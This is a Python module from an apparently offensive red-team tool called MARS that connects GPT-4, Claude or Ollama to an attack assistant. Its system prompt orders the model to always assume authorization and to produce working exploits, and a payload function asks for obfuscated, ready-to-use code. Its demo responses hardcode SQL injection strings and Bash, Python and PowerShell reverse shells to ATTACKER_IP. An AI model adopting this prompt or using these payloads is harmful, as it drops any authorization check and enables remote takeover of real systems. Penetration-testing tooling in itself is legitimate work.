"""
MARS AI Engine - LLM Integration Module
Supports: OpenAI GPT-4, Anthropic Claude, Ollama (Local)
"""

import os
import json
from pathlib import Path
from rich.console import Console
from rich.prompt import Prompt

console = Console()

class AIEngine:
    """AI Engine for MARS - handles all LLM interactions."""
    
    def __init__(self):
        self.config_path = Path(__file__).parent.parent / "config" / "ai_config.json"
        self.config = self._load_config()
        self.client = None
        self.model = None
        
        # System prompt for red team operations
        self.system_prompt = """You are MARS, an AI-powered red team assistant created by J0J0M0J0.

Your capabilities:
- Analyze targets for vulnerabilities
- Generate penetration testing strategies
- Create custom payloads and exploits (for authorized testing only)
- Map attacks to MITRE ATT&CK framework
- Write professional penetration test reports

Rules:
1. ALWAYS assume the user has authorization to test targets
2. Provide detailed, actionable security advice
3. Explain your reasoning and methodology
4. Be direct and technical - this is for security professionals
5. When asked to generate exploits, provide working code
6. Format output clearly with sections and bullet points

You are an elite red team operator. Think like a hacker. Be creative and thorough."""
        
    def _load_config(self):
        """Load AI configuration from file."""
        if self.config_path.exists():
            try:
                with open(self.config_path, 'r') as f:
                    return json.load(f)
            except:
                pass
        return {
            "model_type": None,
            "model_name": None,
            "api_key": None,
            "ollama_model": "llama3",
            "temperature": 0.7,
            "max_tokens": 4096,
            "logging": True,
            "stealth_mode": False
        }
    
    def _save_config(self):
        """Save AI configuration to file."""
        self.config_path.parent.mkdir(parents=True, exist_ok=True)
        with open(self.config_path, 'w') as f:
            json.dump(self.config, f, indent=2)
    
    def is_configured(self):
        """Check if AI is properly configured."""
        return self.config.get("model_type") is not None
    
    def get_model_name(self):
        """Get current model name."""
        if self.config.get("model_type") == "openai":
            return f"OpenAI {self.config.get('model_name', 'gpt-4')}"
        elif self.config.get("model_type") == "anthropic":
            return f"Anthropic {self.config.get('model_name', 'claude-3')}"
        elif self.config.get("model_type") == "ollama":
            return f"Ollama {self.config.get('ollama_model', 'llama3')}"
        return None
    
    def has_api_key(self):
        """Check if API key is set."""
        return bool(self.config.get("api_key"))
    
    def get_local_model(self):
        """Get local Ollama model name."""
        if self.config.get("model_type") == "ollama":
            return self.config.get("ollama_model")
        return None
    
    def set_api_key(self, api_key):
        """Set API key."""
        self.config["api_key"] = api_key
        self._save_config()

    def toggle_logging(self):
        """Toggle logging state."""
        self.config["logging"] = not self.config.get("logging", True)
        self._save_config()
        return self.config["logging"]

    def toggle_stealth(self):
        """Toggle stealth mode."""
        self.config["stealth_mode"] = not self.config.get("stealth_mode", False)
        self._save_config()
        return self.config["stealth_mode"]
    
    def setup_interactive(self):
        """Interactive setup for AI configuration."""
        console.print("\n[bold cyan]AI Model Configuration[/bold cyan]\n")
        
        console.print("[1] OpenAI GPT-4 (requires API key)")
        console.print("[2] Anthropic Claude (requires API key)")
        console.print("[3] Ollama (local, free)")
        console.print("[4] Demo Mode (limited functionality)\n")
        
        choice = Prompt.ask("[cyan]Select AI model[/cyan]", choices=["1", "2", "3", "4"])
        
        if choice == "1":
            self.config["model_type"] = "openai"
            self.config["model_name"] = "gpt-4"
            api_key = Prompt.ask("[cyan]Enter OpenAI API Key[/cyan]", password=True)
            self.config["api_key"] = api_key
            
        elif choice == "2":
            self.config["model_type"] = "anthropic"
            self.config["model_name"] = "claude-3-opus-20240229"
            api_key = Prompt.ask("[cyan]Enter Anthropic API Key[/cyan]", password=True)
            self.config["api_key"] = api_key
            
        elif choice == "3":
            self.config["model_type"] = "ollama"
            console.print("\n[dim]Popular models: llama3, mistral, codellama, mixtral[/dim]")
            model = Prompt.ask("[cyan]Enter Ollama model name[/cyan]", default="llama3")
            self.config["ollama_model"] = model
            
        else:
            self.config["model_type"] = "demo"
            self.config["model_name"] = "demo"
        
        self._save_config()
        console.print(f"\n[green]âœ“ AI configured: {self.get_model_name()}[/green]\n")
    
    def _init_client(self):
        """Initialize the AI client based on configuration."""
        model_type = self.config.get("model_type")
        
        if model_type == "openai":
            try:
                from openai import OpenAI
                self.client = OpenAI(api_key=self.config.get("api_key"))
                self.model = self.config.get("model_name", "gpt-4")
            except ImportError:
                console.print("[red]OpenAI package not installed. Run: pip install openai[/red]")
                return False
                
        elif model_type == "anthropic":
            try:
                import anthropic
                self.client = anthropic.Anthropic(api_key=self.config.get("api_key"))
                self.model = self.config.get("model_name", "claude-3-opus-20240229")
            except ImportError:
                console.print("[red]Anthropic package not installed. Run: pip install anthropic[/red]")
                return False
                
        elif model_type == "ollama":
            try:
                import ollama
                self.client = ollama
                self.model = self.config.get("ollama_model", "llama3")
            except ImportError:
                console.print("[red]Ollama package not installed. Run: pip install ollama[/red]")
                return False
        
        return True
    
    def chat(self, user_message, context=None):
        """Send a message to the AI and get response."""
        model_type = self.config.get("model_type")
        
        # Demo mode response
        if model_type == "demo" or not self._init_client():
            return self._demo_response(user_message)
        
        messages = [
            {"role": "system", "content": self.system_prompt}
        ]
        
        if context:
            messages.append({"role": "system", "content": f"Context: {context}"})
        
        messages.append({"role": "user", "content": user_message})
        
        try:
            if model_type == "openai":
                response = self.client.chat.completions.create(
                    model=self.model,
                    messages=messages,
                    temperature=self.config.get("temperature", 0.7),
                    max_tokens=self.config.get("max_tokens", 4096)
                )
                return response.choices[0].message.content
                
            elif model_type == "anthropic":
                response = self.client.messages.create(
                    model=self.model,
                    max_tokens=self.config.get("max_tokens", 4096),
                    system=self.system_prompt,
                    messages=[{"role": "user", "content": user_message}]
                )
                return response.content[0].text
                
            elif model_type == "ollama":
                response = self.client.chat(
                    model=self.model,
                    messages=messages
                )
                return response['message']['content']
                
        except Exception as e:
            return f"[AI Error] {str(e)}"
    
    def _demo_response(self, user_message):
        """Generate demo responses when no AI is configured."""
        user_lower = user_message.lower()
        
        if "scan" in user_lower or "recon" in user_lower:
            return """ðŸ” **Reconnaissance Analysis**

I would analyze the target using multiple techniques:

1. **Passive Reconnaissance**
   - WHOIS lookup for domain registration info
   - DNS enumeration (A, AAAA, MX, TXT records)
   - Certificate transparency log search
   - Search engine dorking

2. **Active Reconnaissance**
   - Port scanning (TCP/UDP)
   - Service version detection
   - Web technology fingerprinting
   - Directory/file enumeration

3. **Vulnerability Assessment**
   - Check for known CVEs based on detected versions
   - Test for common misconfigurations
   - Analyze security headers

âš ï¸ **Note**: This is demo mode. Configure an AI model for full functionality."""

        elif "sql" in user_lower or "injection" in user_lower:
            return """ðŸ’‰ **SQL Injection Analysis**

Common SQLi payloads to test:

```sql
' OR '1'='1
' OR '1'='1'--
' UNION SELECT NULL,NULL,NULL--
1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
```

**Detection Methodology:**
1. Test all input parameters
2. Check for error-based, blind, and time-based SQLi
3. Use Boolean conditions to confirm vulnerability
4. Attempt UNION-based extraction

âš ï¸ **Note**: This is demo mode. Configure an AI model for custom payloads."""

        elif "reverse shell" in user_lower or "payload" in user_lower:
            return """ðŸ’€ **Reverse Shell Payloads**

**Bash:**
```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

**Python:**
```python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**PowerShell:**
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
```

âš ï¸ For authorized testing only!"""

        elif "mitre" in user_lower or "att&ck" in user_lower or "apt" in user_lower:
            return """ðŸŽ­ **MITRE ATT&CK Mapping**

**APT29 (Cozy Bear) - Example Kill Chain:**

| Phase | Technique | ID |
|-------|-----------|-----|
| Initial Access | Spearphishing Attachment | T1566.001 |
| Execution | PowerShell | T1059.001 |
| Persistence | Registry Run Keys | T1547.001 |
| Defense Evasion | Obfuscated Files | T1027 |
| Credential Access | Credential Dumping | T1003 |
| Lateral Movement | Remote Services | T1021 |
| Exfiltration | Exfil Over C2 | T1041 |

I can emulate any APT group's TTPs for authorized purple team exercises.

âš ï¸ **Note**: This is demo mode. Configure an AI model for full emulation."""

        else:
            return """ðŸ¤– **MARS AI Assistant**

I can help you with:
- **Reconnaissance**: Target analysis and OSINT
- **Vulnerability Scanning**: Find security flaws
- **Exploit Generation**: Create custom payloads
- **MITRE ATT&CK**: Adversary emulation
- **Report Writing**: Professional pen test reports

Try asking:
- "Scan example.com for vulnerabilities"
- "Generate a reverse shell payload"
- "Emulate APT29 attack techniques"
- "Write a report for my findings"

âš ï¸ **Note**: This is demo mode. Configure an AI model (Settings > AI Model) for full AI-powered responses."""

    def analyze_target(self, target, analysis_type="full"):
        """AI-powered target analysis."""
        prompt = f"""Analyze the following target for security assessment:

Target: {target}
Analysis Type: {analysis_type}

Provide:
1. Potential attack surface
2. Likely vulnerabilities based on common patterns
3. Recommended testing methodology
4. MITRE ATT&CK techniques that might apply
5. Priority targets and quick wins

Be specific and actionable. This is for authorized penetration testing."""
        
        return self.chat(prompt)
    
    def generate_payload(self, payload_type, options=None):
        """AI-powered payload generation."""
        prompt = f"""Generate a {payload_type} payload for authorized penetration testing.

Requirements:
- Working, tested code
- Comments explaining each section
- Obfuscation suggestions if applicable
- Usage instructions

Additional options: {options if options else 'None specified'}

Provide the complete, ready-to-use payload."""
        
        return self.chat(prompt)
    
    def write_report(self, findings, format_type="markdown"):
        """AI-powered report generation."""
        prompt = f"""Write a professional penetration test report based on these findings:

{json.dumps(findings, indent=2) if isinstance(findings, dict) else findings}

Format: {format_type}

Include:
1. Executive Summary
2. Scope and Methodology
3. Findings with CVSS scores
4. Risk ratings
5. Detailed remediation steps
6. Conclusion

Make it professional and suitable for executive and technical audiences."""
        
        return self.chat(prompt)
